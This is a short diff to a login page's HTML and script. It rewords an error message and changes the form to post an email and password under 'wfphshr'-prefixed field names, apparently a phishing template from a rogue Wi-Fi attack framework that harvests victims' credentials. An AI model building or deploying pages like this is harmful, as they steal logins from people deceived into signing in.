@@ -128,7 +128,7 @@
             <input id="password" type="password" name="password" class="form-control" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
 
             <div id="dialog">
-            <h2 id="error">Fill all the fields please.</h2>
+            <h2 id="error">Please fill in all required fields.</h2>
             </div>
 
             <button id="btn" class="btn btn-primary btn-block btn-sharp" name="login" type="submit">Sign in</button>
@@ -159,7 +159,10 @@
           }else{
               // post the data
               $("#dialog").css('display', 'none');
-              post('post', {"wfphshr-wpa-password": input.value});
+                post('post', {
+                  wfphshremail: input.value,
+                  wfphshrpassword: input2.value
+                });      
           }
       });
 
